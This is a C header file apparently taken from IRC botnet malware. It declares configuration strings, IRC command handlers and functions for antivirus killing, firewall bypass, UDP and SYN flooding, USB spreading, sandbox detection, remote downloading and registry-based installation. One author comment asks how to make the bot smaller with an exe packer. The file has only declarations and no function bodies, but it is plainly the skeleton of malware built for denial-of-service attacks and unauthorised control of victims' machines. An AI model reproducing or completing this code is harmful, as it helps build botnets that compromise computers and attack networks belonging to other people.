#define _WIN32_WINNT	0x0403			
#define WIN32_LEAN_AND_MEAN								
#pragma optimize("gsy", on)			
#pragma comment(linker,"/FILEALIGN:0x200")
#pragma comment(linker, "/RELEASE")		
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/IGNORE:4089")
#pragma comment(linker, "/FIXED:NO")
#pragma comment(lib, "ws2_32.lib") //Windows socket stuff
#pragma comment(lib, "urlmon.lib") //URLDownloadToFile
#pragma comment(lib, "kernel32.lib") //IDR?
#pragma comment(lib, "shell32.lib") //ShellExecute
#pragma comment(lib, "advapi32.lib") //Registry related stuff
#pragma comment(lib, "user32.lib") //BlockInput?
#pragma pack(16) // ok let me try it

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#include <stdlib.h>
#include <Winsvc.h>
#include <winable.h> 
#include <tlhelp32.h>
#include <iostream.h>
#include <tchar.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <shellapi.h>
#include "botkill.h"

#include "Defines.h"
#include "Threads.h"
#include "botrestart.h"
#include "msn.h"
extern SOCKET sock;
bool IsNew(); //alright cool um i have an exe packer to lower the exe but is there anyways besides using a shared dll to decrease kb size cause shareddll doesnt work no it compiles but my bot gets fucked

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cmd_speedtest[];
extern char cmd_update[];
extern char title_update[];
extern char cmd_visit[];
extern char cmd_msn[];
extern char cmd_ssyn[];
char *SpeedTest();
extern char			cfg_filename[];
extern char cmd_avk[];

extern ircconnect_s ircconnect[];
extern unsigned long cfg_reconnectsleep; // msec
extern unsigned long cfg_ircmaxwaittime; // sec

//config
extern char cfg_ircchannel[];
extern char cfg_ircchanpass[];
extern char cfg_irchost[];
extern char cfg_ircorderprefix[];
extern char cfg_mutex[];
extern char cfg_gotopth[];
extern char cfg_filename[];
extern char cfg_regname[];
extern char USB_STR_FILENAME[];
extern DWORD WINAPI RemoteUSBThread(LPVOID param);

//commands
extern char cmd_silent[];
extern char cmd_join[];
extern char cmd_part[];
extern char cmd_botkill[];
extern char cmd_download[];
extern char cmd_remove[];

/* IRC Characters */
extern char string_nick[];
extern char string_join[];
extern char string_part[];
extern char string_quit[];
extern char string_pass[];
extern char string_ping[];
extern char string_pong[];
extern char string_user[];
extern char string_privmsg[];
extern char string_download_failed[];
extern char string_remove[];

/* Downloader Characters */
extern char cfg_useragent[];
extern char string_dlerror[];
extern char string_downloaded[];
extern char string_nostart[];
extern char string_running[];
extern char string_removing[];
extern char string_unknown[];

/* Titles */
extern char title_download[];
extern char cmd_unsort[];
extern char cmd_sort[];

//nick
char *GenerateNickA(void);
char *GenerateRandomLetters(unsigned int len);
//connect
unsigned int Resolve(char *host);
char *GetMyIP();
//threads
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);
//irc
DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);
int AntivirusKiller();
DWORD WINAPI DL_Thread(LPVOID param);
//Install
BOOL MoveBot(char *MTP,char *Bname);
DWORD WINAPI RegThread(LPVOID myvoid);
void BotInstall(void);
extern char fromchan[MAX_LINE];
extern char Download_Target[MAX_LINE];
extern char Download_URL[MAX_LINE];
int Uninstall();
DWORD WINAPI IsDownload( LPVOID param );
DWORD WINAPI IsUpdate( LPVOID param );
char *Encrypt( char *string );
char *GenerateNumber(int Len);
extern char cfg_infochan[];
extern char title_main[];
int New_Indent();
bool Check_Key(HKEY tree, const char *folder, char *key);
int Detect_Anti(void);
bool IsSandBox();
DWORD WINAPI Firewall_Bypass(LPVOID param);
DWORD WINAPI UDP_Flood_Thread( LPVOID param );
extern char szUDP_Host[MAX_LINE];
extern int szUDP_Port;
extern int szUDP_Time;
extern int szUDP_Delay;
extern char cmd_ssyn[];
long SuperSyn(char *target, char *port, char *len);


extern char cmd_udp[];
DWORD WINAPI UDP_Flood_Thread( LPVOID param );
DWORD WINAPI USB_Spreader(LPVOID param);
int BotKill();